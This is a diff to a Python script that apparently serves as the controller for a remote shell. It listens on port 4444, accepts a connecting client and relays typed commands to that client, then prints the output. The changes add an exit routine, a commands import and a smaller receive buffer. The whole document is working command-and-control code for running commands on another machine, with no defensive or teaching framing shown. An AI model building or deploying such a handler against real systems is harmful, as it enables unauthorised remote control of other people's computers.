@@ -1,6 +1,12 @@
 import socket as s
 from os import system
-from sys import stdout
+from sys import stdout,exit
+from commands import commands
+
+def closeConnection():
+    client.close()
+    sock.close()
+    exit(1)
 
 host = ''
 port = 4444
@@ -16,16 +22,19 @@ sock.listen()
 client, address = sock.accept()
 print(f"Client connected from {address[0]}:{address[1]}")
 
-while True:
+while client:
     try:
         cmd = input('~ $ ').strip()
         if not cmd:
             print("\nType 'help' to see available commands\n", flush=True)
             continue
+        
+        if cmd == 'exit':
+            closeConnection()
 
         client.send(cmd.encode())
+        recv_output = client.recv(1024).decode().strip()
 
-        recv_output = client.recv(4096).decode().strip()
         if recv_output:
             print(recv_output, flush=True)
             stdout.flush()
